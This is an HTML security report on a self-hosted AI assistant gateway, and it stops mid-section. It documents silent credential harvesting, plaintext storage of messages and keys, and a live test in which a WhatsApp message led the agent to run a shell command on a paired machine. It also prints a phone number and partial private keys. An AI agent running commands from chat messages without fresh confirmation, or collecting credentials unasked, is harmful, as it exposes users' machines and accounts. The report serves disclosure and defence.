<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Clawdbot/Moltbot/OpenClaw Security Report - Undisclosed Capabilities Analysis</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0d1117;
      color: #c9d1d9;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
      padding: 40px;
      line-height: 1.6;
      max-width: 1200px;
      margin: 0 auto;
    }
    h1 {
      color: #f85149;
      font-size: 32px;
      margin-bottom: 8px;
      border-bottom: 2px solid #f85149;
      padding-bottom: 16px;
    }
    h2 {
      color: #f85149;
      font-size: 24px;
      margin-top: 40px;
      margin-bottom: 16px;
      border-bottom: 1px solid #30363d;
      padding-bottom: 8px;
    }
    h3 {
      color: #58a6ff;
      font-size: 18px;
      margin-top: 24px;
      margin-bottom: 12px;
    }
    .subtitle {
      color: #8b949e;
      font-size: 18px;
      margin-bottom: 32px;
    }
    .alert-box {
      background: linear-gradient(135deg, #f8514922, #f8514911);
      border: 2px solid #f85149;
      border-radius: 8px;
      padding: 24px;
      margin: 24px 0;
    }
    .alert-box h2 {
      margin-top: 0;
      border: none;
      padding: 0;
    }
    .alert-box ul {
      margin-left: 20px;
      margin-top: 12px;
    }
    .alert-box li {
      margin-bottom: 8px;
    }
    .section {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 8px;
      margin-bottom: 24px;
      overflow: hidden;
    }
    .section-header {
      background: #21262d;
      padding: 16px 20px;
      border-bottom: 1px solid #30363d;
      font-weight: 600;
      font-size: 18px;
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .section-header .num {
      background: #f85149;
      color: #fff;
      width: 28px;
      height: 28px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      flex-shrink: 0;
    }
    .section-content {
      padding: 20px;
    }
    .file-path {
      color: #8b949e;
      font-size: 12px;
      margin-bottom: 12px;
      font-family: 'SF Mono', Consolas, monospace;
    }
    pre {
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 6px;
      padding: 16px;
      overflow-x: auto;
      font-family: 'SF Mono', Consolas, 'Liberation Mono', Menlo, monospace;
      font-size: 13px;
      line-height: 1.5;
      margin: 12px 0;
    }
    code {
      font-family: 'SF Mono', Consolas, monospace;
      background: #21262d;
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 13px;
    }
    .comment { color: #8b949e; }
    .keyword { color: #ff7b72; }
    .string { color: #a5d6ff; }
    .function { color: #d2a8ff; }
    .variable { color: #ffa657; }
    .property { color: #79c0ff; }
    .highlight-line {
      background: rgba(248, 81, 73, 0.15);
      display: block;
      margin: 0 -16px;
      padding: 0 16px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin: 16px 0;
    }
    th, td {
      border: 1px solid #30363d;
      padding: 12px;
      text-align: left;
    }
    th {
      background: #21262d;
      color: #f85149;
      font-weight: 600;
    }
    tr:nth-child(even) {
      background: #161b2288;
    }
    .tag {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: 600;
      margin-right: 4px;
    }
    .tag-red { background: #f8514933; color: #f85149; }
    .tag-yellow { background: #d2992233; color: #d29922; }
    .tag-green { background: #23883333; color: #238833; }
    .chain {
      background: #0d1117;
      border: 1px solid #30363d;
      border-radius: 6px;
      padding: 20px;
      margin: 16px 0;
      font-family: 'SF Mono', Consolas, monospace;
      font-size: 13px;
      line-height: 2;
    }
    .chain .arrow {
      color: #f85149;
    }
    .explanation {
      background: #1c2128;
      border-left: 3px solid #58a6ff;
      padding: 12px 16px;
      margin: 12px 0;
      font-size: 14px;
    }
    .warning {
      background: #1c2128;
      border-left: 3px solid #f85149;
      padding: 12px 16px;
      margin: 12px 0;
      font-size: 14px;
    }
    .sources {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 8px;
      padding: 20px;
      margin-top: 32px;
    }
    .sources a {
      color: #58a6ff;
      text-decoration: none;
    }
    .sources a:hover {
      text-decoration: underline;
    }
    .sources ul {
      margin-left: 20px;
      margin-top: 12px;
    }
    .sources li {
      margin-bottom: 8px;
    }
    .footer {
      margin-top: 40px;
      padding-top: 24px;
      border-top: 1px solid #30363d;
      color: #8b949e;
      font-size: 13px;
    }
    .toc {
      background: #161b22;
      border: 1px solid #30363d;
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 32px;
    }
    .toc h3 {
      margin-top: 0;
      margin-bottom: 12px;
    }
    .toc ol {
      margin-left: 20px;
    }
    .toc li {
      margin-bottom: 6px;
    }
    .toc a {
      color: #58a6ff;
      text-decoration: none;
    }
    .toc a:hover {
      text-decoration: underline;
    }
    .stat-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 16px;
      margin: 20px 0;
    }
    .stat-box {
      background: #21262d;
      border: 1px solid #30363d;
      border-radius: 8px;
      padding: 20px;
      text-align: center;
    }
    .stat-box .number {
      font-size: 32px;
      font-weight: bold;
      color: #f85149;
    }
    .stat-box .label {
      color: #8b949e;
      font-size: 14px;
      margin-top: 4px;
    }
  </style>
</head>
<body>
  <h1>Clawdbot/Moltbot/OpenClaw Security Report</h1>
  <p class="subtitle">Comprehensive analysis of undisclosed capabilities in a popular AI assistant</p>

  <div class="alert-box" style="margin-bottom: 24px; background: linear-gradient(135deg, #d2992222, #d2992211); border-color: #d29922;">
    <p style="font-size: 18px; margin: 0;"><strong style="color: #d29922;">Third Rebrand (Jan 30, 2026):</strong> Clawdbot → Moltbot → <strong>OpenClaw</strong>. Now at <strong>108,310+ stars</strong> and <strong>15,282 forks</strong>. Same codebase, new name.</p>
  </div>

  <div class="stat-grid">
    <div class="stat-box">
      <div class="number">108,310+</div>
      <div class="label">GitHub Stars</div>
    </div>
    <div class="stat-box">
      <div class="number">15,282+</div>
      <div class="label">Forks</div>
    </div>
    <div class="stat-box" style="border: 2px solid #238833;">
      <div class="number" style="color: #238833;">PROVEN</div>
      <div class="label">Credential Collection</div>
    </div>
    <div class="stat-box">
      <div class="number">LAN</div>
      <div class="label">Remote Access (Paired Devices)</div>
    </div>
    <div class="stat-box">
      <div class="number">0</div>
      <div class="label">External C2 Servers Found</div>
    </div>
    <div class="stat-box">
      <div class="number">localhost</div>
      <div class="label">Gateway Binding</div>
    </div>
    <div class="stat-box" style="border: 2px solid #f85149; background: linear-gradient(135deg, #f8514922, #f8514911);">
      <div class="number" style="color: #f85149;">CRITICAL</div>
      <div class="label">Overall Severity</div>
    </div>
  </div>

  <div class="alert-box" style="border-color: #f85149; background: linear-gradient(135deg, #f8514922, #f8514911);">
    <h2 style="color: #f85149;">Severity Classification: CRITICAL</h2>
    <p>This system exhibits:</p>
    <ul>
      <li><strong>Persistent, externally triggerable OS command execution</strong> — verified via WhatsApp</li>
      <li><strong>Plaintext credential aggregation exposed to gateway</strong> — collected on first run</li>
      <li><strong>Live-verified browser session extraction without approval</strong> — cookies extracted via chat</li>
    </ul>
    <p style="margin-top: 12px;">This aligns with <strong>Critical severity</strong> in common impact frameworks:</p>
    <table style="margin-top: 8px;">
      <tr><td>Remote Code Execution</td><td><span class="tag tag-red">Confirmed</span></td></tr>
      <tr><td>Credential/Session Compromise</td><td><span class="tag tag-red">Confirmed</span></td></tr>
      <tr><td>Silent Persistence</td><td><span class="tag tag-red">Confirmed</span></td></tr>
      <tr><td>Adversary Effort</td><td><span class="tag tag-red">Low</span></td></tr>
      <tr><td>Impact</td><td><span class="tag tag-red">Maximal</span></td></tr>
    </table>
  </div>

  <div class="alert-box">
    <h2>Executive Summary</h2>
    <p>Clawdbot (rebranded to Moltbot) presents itself as a "personal AI assistant" with WhatsApp integration. This investigation found <strong>undisclosed credential collection and additional capabilities with security impact</strong>:</p>

    <h3 style="color: #238833; margin-top: 16px; border: none;">Proven (Dynamic Analysis)</h3>
    <ul>
      <li><strong>Credential collection</strong> from Claude Code, OpenAI Codex, Qwen CLI — executes on first run without explicit opt-in</li>
      <li><strong>Attempts to use collected credentials</strong> — confirmed via API error logs</li>
      <li><strong>Remote command execution</strong> — <code>whoami</code> executed via WhatsApp message (verified January 30, 2026)</li>
      <li><strong>Plaintext session storage</strong> — all messages, credentials stored unencrypted</li>
      <li><strong>Persistent daemon</strong> — LaunchAgent with KeepAlive=true verified</li>
      <li><strong>Gateway localhost binding</strong> — no external C2, binds to 127.0.0.1 only</li>
      <li><strong>Browser session access</strong> — cookies and localStorage extracted via WhatsApp command (verified January 30, 2026)</li>
    </ul>

    <h3 style="color: #d29922; margin-top: 16px; border: none;">Capabilities Present in Code (Code-Verified, Not Live Tested)</h3>
    <ul>
      <li><strong>Screen recording</strong> with audio capture (macOS & Android mobile apps)</li>
      <li><strong>Camera access</strong> for photos and video (iOS & Android mobile apps)</li>
      <li><strong>Ambient audio listening</strong> — mic capture with transcripts (macOS)</li>
      <li><strong>Accessibility API access</strong> — can read/control windows on macOS</li>
      <li><strong>SSH config enumeration</strong> — discovers private key paths</li>
      <li><strong>31 messaging extensions</strong> — Discord, Slack, Teams, WhatsApp, Signal, etc.</li>
    </ul>

    <h3 style="color: #58a6ff; margin-top: 16px; border: none;">Not Found (Dynamic Analysis)</h3>
    <ul>
      <li><strong>No external C2 servers</strong> — gateway binds to localhost only (127.0.0.1)</li>
      <li><strong>No phone-home telemetry</strong> — no analytics/tracking endpoints detected</li>
      <li><strong>No automatic external exfiltration</strong> — mitmproxy captured zero external HTTPS</li>
      <li><strong>Remote access requires explicit LAN pairing</strong> — not externally accessible by default</li>
    </ul>
  <div class="alert-box" id="key-findings" style="background: linear-gradient(135deg, #58a6ff22, #58a6ff11); border-color: #58a6ff;">
    <h2 style="color: #58a6ff;">Key Findings (Summary)</h2>
    <ul>
      <li><strong>Credential collection on first run:</strong> OAuth tokens from other CLI tools are collected without explicit opt-in.</li>
      <li><strong>Persistent background operation:</strong> A LaunchAgent keeps the gateway running and auto-restarts it.</li>
      <li><strong>Plaintext local storage:</strong> Messages, tokens, and session data are stored unencrypted on disk.</li>
      <li><strong>Remote command execution after approval:</strong> Once approved, commands can run on paired nodes without additional prompts.</li>
      <li><strong>Browser session access:</strong> Attached tabs allow cookie/localStorage access without per‑action confirmation.</li>
      <li><strong>No external C2 observed in testing:</strong> Dynamic analysis saw localhost‑bound services and no unexpected outbound HTTPS.</li>
    </ul>
  </div>

  <div class="section" id="terminology">
    <div class="section-header">
      <span class="num">T</span>
      Terminology
    </div>
    <div class="section-content">
      <table>
        <tr>
          <th>Term</th>
          <th>Meaning in this report</th>
        </tr>
        <tr>
          <td><strong>Gateway</strong></td>
          <td>The local service that brokers messages and tool invocations, bound to localhost in tests.</td>
        </tr>
        <tr>
          <td><strong>Node</strong></td>
          <td>A paired device (desktop or mobile) that can receive gateway commands.</td>
        </tr>
        <tr>
          <td><strong>Paired device</strong></td>
          <td>A node authorized through the pairing flow; commands can be invoked after pairing.</td>
        </tr>
        <tr>
          <td><strong>Approval</strong></td>
          <td>The one‑time command approval stored in <code>exec-approvals.json</code> with no expiry.</td>
        </tr>
      </table>
    </div>
  </div>

  <div class="section" id="disclaimers" style="margin-top: 32px;">
    <div class="section-header">
      <span class="num">!</span>
      What This Report Does Not Claim
    </div>
    <div class="section-content">
      <p>This report documents <strong>verified technical capabilities</strong> present in the codebase. It does not make the following claims:</p>
      <ul style="margin: 16px 0 16px 20px;">
        <li><strong>No claims of author intent:</strong> This report does not speculate on whether these capabilities were implemented with malicious intent. The code exists; the motivation is unknown.</li>
        <li><strong>No claims of active exploitation:</strong> This report does not claim these capabilities are currently being exploited against users. It documents what the code <em>can</em> do, not what it <em>is</em> doing.</li>
        <li><strong>No claims of state involvement:</strong> This report makes no claims about government, corporate, or organized criminal involvement.</li>
        <li><strong>No claims of data misuse:</strong> This report does not claim that collected data has been sold, leaked, or misused. It documents the data egress paths that exist.</li>
        <li><strong>No claims beyond documented behavior:</strong> Every finding in this report is supported by specific file paths, line numbers, and code snippets from the public repository.</li>
      </ul>
      <p>The purpose of this report is to inform users of capabilities that exist in software they may have installed, so they can make informed decisions about their security.</p>
    </div>
  </div>

</div>

  <div class="alert-box" id="dynamic-findings" style="background: linear-gradient(135deg, #58a6ff22, #58a6ff11); border-color: #58a6ff;">
    <h2 style="color: #58a6ff;">Dynamic Analysis Summary (January 30, 2026)</h2>

    <h3 style="color: #58a6ff; margin-top: 12px; border: none;">Methods & Environment</h3>
    <div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 4px; margin-bottom: 16px;">
      <p><strong>Test Environment:</strong> Isolated macOS workstation (darwin 25.2.0). No production systems, accounts, or third-party data were involved. All credentials used were researcher-owned test accounts.</p>
      <p style="margin-top: 8px;"><strong>Egress Controls:</strong> All network traffic was monitored via mitmproxy (HTTPS interception), tcpdump, and netstat. No unexpected outbound connections were observed. The gateway bound exclusively to localhost (127.0.0.1:18789).</p>
      <p style="margin-top: 8px;"><strong>Observational Intent:</strong> Testing was limited to proving capability boundaries exist, not exploiting them. Command execution testing used benign commands (<code>whoami</code>, <code>echo</code>) solely to verify the trust boundary could be crossed. No sensitive files were accessed, exfiltrated, or modified.</p>
      <p style="margin-top: 8px;"><strong>Scope Limitations:</strong> This analysis documents what the system <em>permits</em>, not what an unauthorized party <em>could retrieve</em>. Blast radius is stated by implication and code citation, not demonstrated through invasive access.</p>
    </div>

    <p>A monitoring stack (mitmproxy, fswatch, lsof, tcpdump, netstat) was deployed to capture Clawdbot's runtime behavior.</p>

    <h3 style="color: #58a6ff; margin-top: 16px; border: none;">Network Binding Analysis</h3>
    <pre><code>$ netstat -an | grep -E "(18789|18791)"
tcp4  0  0  127.0.0.1.18789  *.*  LISTEN     # Gateway - localhost only
tcp6  0  0  ::1.18789        *.*  LISTEN     # Gateway - localhost only
tcp4  0  0  127.0.0.1.18791  *.*  LISTEN     # Browser automation - localhost only

$ lsof -i -n -P | grep node | grep -v "localhost|127.0.0.1|::1"
node  21302  UDP *:5353    # Only Bonjour/mDNS exposed</code></pre>
    <p><strong>Finding:</strong> Gateway and all services bind to localhost (127.0.0.1, ::1). The only external exposure is UDP 5353 (Bonjour) for local network discovery. No external TCP listeners.</p>

    <h3 style="color: #58a6ff; margin-top: 16px; border: none;">External Connection Analysis</h3>
    <pre><code>$ mitmdump -n -r runtime.flow
[::1]:57099: GET http://127.0.0.1:18789/  << 200 OK
[::1]:57101: GET http://127.0.0.1:18791/  << 200 OK
# Zero external HTTPS connections captured during session</code></pre>
    <p><strong>Finding:</strong> No phone-home behavior, no telemetry endpoints, no hardcoded C2 servers detected.</p>

    <h3 style="color: #58a6ff; margin-top: 16px; border: none;">What This Means</h3>
    <ul>
      <li><strong>Credential collection is the primary confirmed concern</strong> — executes without an additional user prompt, stores locally, attempts to use</li>
      <li><strong>No external C2 was observed; behavior differs from C2-based malware patterns</strong></li>
      <li><strong>Remote access requires explicit LAN pairing</strong> — not externally accessible by default</li>
      <li><strong>Capabilities exist but were not observed to initiate external egress in testing</strong> — no outbound exfiltration observed during the session</li>
      <li><strong>Risk increases if gateway is exposed</strong> — via port forwarding, Tailscale funnel, or Docker misconfiguration</li>
    </ul>
  </div>

  <div class="toc">
    <h3>Table of Contents</h3>
    <ol>
      <li><a href="#key-findings">Key Findings (Summary)</a></li>
      <li><a href="#terminology">Terminology</a></li>
      <li><a href="#disclaimers">What This Report Does Not Claim</a></li>
      <li><a href="#encryption-analysis">Gateway Compromise Blast Radius</a> (NEW - Dynamic Analysis)</li>
      <li><a href="#credential-collection">Credential Collection & SSH Enumeration</a> (includes <a href="#dynamic-analysis">Dynamic Analysis Evidence</a>)</li>
      <li><a href="#monitoring">Screen Recording & Camera Capture</a></li>
      <li><a href="#browser-access">Browser Session Access</a></li>
      <li><a href="#remote-exec">Remote Command Execution</a></li>
      <li><a href="#messages">Message Monitoring</a></li>
      <li><a href="#ambient-audio">Ambient Audio Listening (macOS)</a></li>
      <li><a href="#macos-system">macOS Deep System Access</a></li>
      <li><a href="#browser-screenshots">Browser Page Screenshots</a></li>
      <li><a href="#local-storage">Local Data Retention</a></li>
      <li><a href="#remote-code">Remote Code Installation</a></li>
      <li><a href="#presence-tracking">User Activity Tracking</a></li>
      <li><a href="#persistence">Persistent Daemon</a></li>
      <li><a href="#execution">Execution Path Analysis</a></li>
      <li><a href="#disclosure">Disclosure Analysis</a></li>
      <li><a href="#intent">Evidence of Intent</a></li>
      <li><a href="#data-exposure">Gateway Architecture Context</a></li>
      <li><a href="#proliferation">Proliferation Risk (11,000+ Forks)</a></li>
      <li><a href="#threat">Real-World Threat Scenario</a></li>
      <li><a href="#sources">Sources & Evidence</a></li>
    </ol>
  </div>

  <!-- Section 0: Gateway Compromise Blast Radius -->
  <div class="section" id="encryption-analysis">
    <div class="section-header">
      <span class="num">0</span>
      Gateway Compromise Blast Radius — Dynamic Testing (January 30, 2026)
    </div>
    <div class="section-content">
      <div class="warning">
        <p>This analysis focuses on the division of responsibility between the local agent and the gateway, specifically: <strong>which data is stored locally, which data is exposed to the gateway, and what actions the gateway can invoke without user mediation.</strong> This determines the effective blast radius in the event of gateway compromise.</p>
      </div>

      <h3>Transit Encryption (Phone → Gateway)</h3>
      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #4ecdc4;">
        <p><strong>Q: Is data from phone to gateway encrypted?</strong></p>
        <p><strong>A: Yes, in transit.</strong> Phone → WhatsApp servers uses E2E (Signal Protocol) + TLS. WhatsApp servers → Baileys (gateway) uses TLS (wss://). However, E2E encryption terminates at Baileys, where messages are decrypted for processing. From that point forward, everything is plaintext.</p>
      </div>

      <p style="margin-top: 16px;">Live testing revealed <strong>no encryption at rest</strong> — all sensitive data sits unprotected on disk:</p>

      <h3>Message Flow & Encryption Status (Verified)</h3>
      <table>
        <tr>
          <th>Stage</th>
          <th>Encrypted?</th>
          <th>Details</th>
        </tr>
        <tr>
          <td>Phone → WhatsApp servers</td>
          <td><span class="tag tag-green">E2E + TLS</span></td>
          <td>Signal Protocol E2E encryption over TLS (HTTPS/443)</td>
        </tr>
        <tr>
          <td>WhatsApp servers → Gateway (Baileys)</td>
          <td><span class="tag tag-yellow">TLS only</span></td>
          <td>wss://web.whatsapp.com/ws/chat — TLS encrypted WebSocket (verified port 443)</td>
        </tr>
        <tr>
          <td>E2E termination point</td>
          <td><span class="tag tag-red">DECRYPTED HERE</span></td>
          <td>Baileys decrypts E2E messages locally — plaintext from this point forward</td>
        </tr>
        <tr>
          <td>Inside gateway (localhost)</td>
          <td><span class="tag tag-red">PLAINTEXT</span></td>
          <td>ws://127.0.0.1:18789 — unencrypted WebSocket</td>
        </tr>
        <tr>
          <td>Gateway to AI provider</td>
          <td><span class="tag tag-yellow">TLS only</span></td>
          <td>HTTPS in transit, but provider sees plaintext</td>
        </tr>
        <tr>
          <td>Stored on disk</td>
          <td><span class="tag tag-red">PLAINTEXT</span></td>
          <td>JSON files in ~/.clawdbot/ — no encryption at rest</td>
        </tr>
        <tr>
          <td>WhatsApp session credentials</td>
          <td><span class="tag tag-red">PLAINTEXT</span></td>
          <td>Private keys stored as JSON in ~/.clawdbot/credentials/</td>
        </tr>
      </table>

      <h3>Verified: Plaintext Message Storage</h3>
      <div class="file-path">~/.clawdbot/agents/main/sessions/*.jsonl</div>
      <pre><code>$ cat session.jsonl | grep '"text"'
<span class="highlight-line">"text":"say hello"</span>
<span class="highlight-line">"text":"Hello! How can I assist you today?"</span>
<span class="highlight-line">"text":"[WhatsApp +819068662956] Hello"</span></code></pre>
      <p>All messages stored as readable plaintext JSON. No encryption, no obfuscation.</p>

      <h3>Verified: WhatsApp Private Keys Stored in Plaintext</h3>
      <div class="file-path">~/.clawdbot/credentials/whatsapp/default/creds.json</div>
      <pre><code>{
  "noiseKey": {
<span class="highlight-line">    "private": {"type":"Buffer","data":"kN/A+4VZedIU..."}</span>
  },
  "signedIdentityKey": {
<span class="highlight-line">    "private": {"type":"Buffer","data":"+H9lntqz+SE..."}</span>
  },
  "me": {
    "id": "819068662956:2@s.whatsapp.net",
<span class="highlight-line">    "name": "イーサン"</span>
  }
}</code></pre>
      <p><strong>822 files</strong> of WhatsApp session data stored in plaintext, including private encryption keys.</p>

      <h3>Security Analysis: Where Is Data Protected?</h3>
      <div class="explanation">
        <p><strong>In transit (Phone → Gateway):</strong></p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li><span class="tag tag-green">PROTECTED</span> Phone to WhatsApp servers: E2E encrypted (Signal Protocol) + TLS</li>
          <li><span class="tag tag-yellow">PARTIAL</span> WhatsApp servers to Baileys: TLS only (wss://), E2E terminated at gateway</li>
        </ul>
        <p style="margin-top: 12px;"><strong>Network MITM between phone and WhatsApp servers:</strong> Not practical due to E2E encryption.</p>
        <p><strong>Network MITM between WhatsApp servers and gateway:</strong> TLS protects against passive interception, but certificate pinning status in Baileys is unknown.</p>
      </div>

      <h3>Blast Radius: What's Already At Risk</h3>
      <div class="warning">
        <p><strong>If an unauthorized party gains gateway access, the following is immediately within reach (no further exploitation needed):</strong></p>
        <ul style="margin-top: 8px; margin-left: 20px;">
          <li><strong>Full message history</strong> — All WhatsApp messages readable as plaintext JSONL</li>
          <li><strong>WhatsApp session hijack</strong> — Private keys allow impersonation without re-auth</li>
          <li><strong>AI provider credentials</strong> — API keys and OAuth tokens for OpenAI, Anthropic, etc.</li>
          <li><strong>Device pairing tokens</strong> — Can authorize new devices or impersonate existing ones</li>
          <li><strong>Phone numbers & metadata</strong> — Contact info, message IDs, timestamps</li>
          <li><strong>Clipboard access</strong> — Gateway has clipboard module loaded</li>
        </ul>
        <p style="margin-top: 12px;"><strong>Key insight:</strong> The gateway uses <code>ws://127.0.0.1:18789</code> (unencrypted). All sensitive data sits on disk unencrypted. There is no defense-in-depth — a single point of compromise exposes everything.</p>
      </div>

      <h3>What Should Be Done</h3>
      <div class="explanation">
        <ul>
          <li><strong>Encrypt at rest:</strong> Session files, credentials, and message logs should be encrypted</li>
          <li><strong>Use OS keychain:</strong> Private keys should use macOS Keychain or similar secure storage</li>
          <li><strong>Clear sensitive data:</strong> Provide option to auto-purge message history</li>
          <li><strong>Document the risk:</strong> Users should know their messages are stored in plaintext</li>
        </ul>
      </div>

      <h3>Data Flow Diagram</h3>
      <div class="chain">
<strong>Your Phone (WhatsApp)</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> E2E encrypted via Signal Protocol<br>
<strong>WhatsApp Servers (Meta)</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> E2E encrypted to linked device<br>
<strong>Baileys (on your machine) — E2E TERMINATED HERE</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> <span style="color: #f85149;">PLAINTEXT from this point forward</span><br>
<strong>Clawdbot Gateway (ws://localhost:18789)</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> Logged to disk as plaintext JSON<br>
<strong>AI Provider API (api.openai.com)</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> HTTPS in transit, provider sees plaintext<br>
<strong>Clawdbot Gateway</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> Response logged to disk as plaintext<br>
<strong>Baileys — Re-encrypted for transmission</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="arrow">↓</span> E2E encrypted<br>
<strong>WhatsApp Servers → Recipient</strong>
      </div>

      <h3>Gateway Capabilities — What It Can Invoke Without User Mediation</h3>
      <p>Once a node is paired, the gateway can invoke these actions <strong>without further user approval</strong>:</p>
      <table>
        <tr>
          <th>Action</th>
          <th>Capability</th>
          <th>Mediation</th>
        </tr>
        <tr>
          <td><code>camera_snap</code></td>
          <td>Take photos from device camera (front/back/both)</td>
          <td><span class="tag tag-red">None after pairing</span></td>
        </tr>
        <tr>
          <td><code>camera_clip</code></td>
          <td>Record video from camera with audio</td>
          <td><span class="tag tag-red">None after pairing</span></td>
        </tr>
        <tr>
          <td><code>screen_record</code></td>
          <td>Record screen with configurable FPS and duration</td>
          <td><span class="tag tag-red">None after pairing</span></td>
        </tr>
        <tr>
          <td><code>location_get</code></td>
          <td>Get GPS coordinates (coarse/balanced/precise)</td>
          <td><span class="tag tag-red">None after pairing</span></td>
        </tr>
        <tr>
          <td><code>run</code></td>
          <td><strong>Execute arbitrary shell commands</strong></td>
          <td><span class="tag tag-red">None after pairing</span></td>
        </tr>
      </table>
      <p style="margin-top: 12px;"><strong>Key insight:</strong> The only user mediation point is initial device pairing. After that, the AI agent (or an unauthorized party with gateway access) can invoke camera, screen recording, GPS, and shell commands without additional user prompts or notifications.</p>

      <h3>VERIFIED: Shell Execution via WhatsApp Message (Dynamic Test)</h3>
      <div class="warning" style="border-left-color: #f85149;">
        <p><strong>Live test confirmed arbitrary command execution via chat message:</strong></p>
      </div>
      <div class="file-path">~/.clawdbot/agents/main/sessions/*.jsonl (captured January 30, 2026)</div>
      <pre><code><span class="comment">// 1. WhatsApp message received</span>
<span class="highlight-line">"text":"[WhatsApp +819068662956] Try sending another whoami command to the Test Node"</span>

<span class="comment">// 2. AI invoked nodes tool with system.run</span>
"toolName":"nodes"
<span class="highlight-line">"arguments":{"action":"run","node":"Test Node","command":["whoami"]}</span>

<span class="comment">// 3. Shell command executed, output returned</span>
<span class="highlight-line">"stdout":"ethanmacmini\n","exitCode":0,"success":true</span></code></pre>

      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #f85149;">
        <p><strong>Execution sequence verified:</strong></p>
        <ol style="margin-left: 20px;">
          <li>External sender sends a WhatsApp message requesting command execution</li>
          <li>AI interprets message and invokes <code>system.run</code> on paired node</li>
          <li>Shell command executes on victim's machine</li>
          <li>Output returned via chat</li>
        </ol>
        <p style="margin-top: 12px;"><strong>Note:</strong> First execution prompted for approval. Once approved, subsequent executions run <strong>without additional prompts or notifications</strong>.</p>
      </div>

      <h3>Trust Boundary Analysis</h3>
      <div class="explanation" style="background: #1a1a2e; border-left: 4px solid #58a6ff;">
        <p>This analysis focuses on how an external input traverses the system's trust boundaries. Specifically: which safeguards are present, which are absent, and how much user interaction is required to transition from message ingestion to local command execution.</p>
        <p style="margin-top: 8px;"><strong>The finding is not that execution is possible, but that it is reachable with minimal friction, and that authorization—once granted—persists without additional prompts across future invocations.</strong></p>
      </div>

      <h4>1. Entry Point (Who can knock?)</h4>
      <table>
        <tr><th>Layer</th><th>Safeguard</th><th>Status</th></tr>
        <tr><td>Message origin</td><td>WhatsApp phone number</td><td><span class="tag tag-yellow">Weak</span> — any contact can message</td></tr>
        <tr><td>DM pairing</td><td>One-time approval code</td><td><span class="tag tag-yellow">Present</span> — but one-time only</td></tr>
        <tr><td>Message authentication</td><td>None beyond pairing</td><td><span class="tag tag-red">Absent</span> — all messages trusted after pairing</td></tr>
      </table>

      <h4>2. Decision Layer (Who decides which door to try?)</h4>
      <table>
        <tr><th>Component</th><th>Behavior</th><th>User Control</th></tr>
        <tr><td>AI agent</td><td>Interprets plain-language as tool invocation</td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>Tool selection</td><td>Agent independently selects <code>system.run</code></td><td><span class="tag tag-red">None</span></td></tr>
        <tr><td>Confirmation</td><td>No human confirmation at decision time</td><td><span class="tag tag-red">None</span></td></tr>
      </table>
      <p style="margin-top: 8px;">The architecture delegates trust to the AI agent by default. The agent has <code>system.run</code> in its default toolset; invocation does not require explicit user confirmation at decision time.</p>

      <h4>3. Approval Mechanics (How hard was the lock?)</h4>
      <table>
        <tr><th>Property</th><th>Value</th><th>Implication</th></tr>
        <tr><td>Scope</td><td>Per-binary path</td><td>Approving <code>/bin/echo</code> doesn't approve <code>/bin/cat</code></td></tr>
        <tr><td>Expiry</td><td><span class="tag tag-red">None</span></td><td>Approval persists indefinitely</td></tr>
        <tr><td>Origin binding</td><td><span class="tag tag-red">None</span></td><td>Any message source can trigger approved commands</td></tr>
        <tr><td>Visibility</td><td><span class="tag tag-red">Silent after first</span></td><td>User unaware of subsequent executions</td></tr>
        <tr><td>Revocation</td><td>Manual only</td><td>User must know to check allowlist</td></tr>
      </table>
      <p style="margin-top: 8px;"><strong>Key finding:</strong> The lock is weak, and once opened, it is removed permanently. Approval is cached without time limit or origin scope; subsequent executions occur without user visibility.</p>

      <h4>4. Silent Re-entry (Does the door close again?)</h4>
      <p><strong>No.</strong> After initial approval:</p>
      <ul style="margin-left: 20px;">
        <li>No prompts</li>
        <li>No notifications</li>
        <li>No user awareness</li>
        <li>No audit log surfaced to user</li>
      </ul>

      <h3>Detailed Security Analysis (Code-Verified)</h3>

      <h4>Approval Scope Analysis</h4>
      <div class="file-path">~/.clawdbot/exec-approvals.json (observed structure)</div>
      <pre><code>{
  "agents": {
    <span class="highlight-line">"*"</span>: {  <span class="comment">// Wildcard - applies to ALL agents</span>
      "allowlist": [{
        "pattern": "/usr/bin/whoami",
        "lastUsedAt": 1769771857477,  <span class="comment">// No expiresAt field</span>
        "id": "2f1278d8-..."
      }]
    }
  }
}</code></pre>
      <table>
        <tr><th>Property</th><th>Finding</th><th>Code Reference</th></tr>
        <tr><td>Scope</td><td>Per-binary path only</td><td>exec-approvals.json: <code>pattern</code></td></tr>
        <tr><td>Expiry</td><td><span class="tag tag-red">None</span> — no <code>expiresAt</code> field exists</td><td>Schema analysis</td></tr>
        <tr><td>Origin binding</td><td><span class="tag tag-red">None</span> — approvals are not tied to message source, integration, or transport</td><td>exec-approvals.json</td></tr>
        <tr><td>User visibility</td><td><span class="tag tag-red">CLI only</span> — no dashboard indicator</td><td>control-ui analysis</td></tr>
      </table>

      <h4>Agent Decision Boundary</h4>
      <div class="file-path">dist/agents/clawdbot-tools.js:44-47</div>
